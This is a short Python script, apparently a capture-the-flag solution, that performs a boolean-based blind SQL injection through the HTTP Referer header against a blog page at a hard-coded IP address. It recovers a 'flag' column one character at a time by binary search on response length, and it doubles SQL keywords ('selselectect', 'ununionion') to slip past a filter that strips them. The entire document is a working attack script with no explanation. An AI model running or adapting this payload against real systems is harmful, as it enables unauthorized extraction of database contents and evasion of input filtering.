import requests
url='http://120.92.151.189/blog/single.php?id=1'
flag=''
for i in range(1,100):
    left=33
    right=128

    while right-left!=1:
        mid=(left+right)//2
        payload="0123'^if(substr((selselectect flag from flag),{i},1)>binary {mid},(selecselectt 1+~0),0) ununionion selecselectt 1,2#".format(i=i,mid=hex(mid))
        headers={
        'Referer':payload
        }
        r=requests.get(url=url,headers=headers)
        if len(r.text) == 5596:
            left=mid
        else:
            right=mid
    flag+=chr(right)
    print (flag)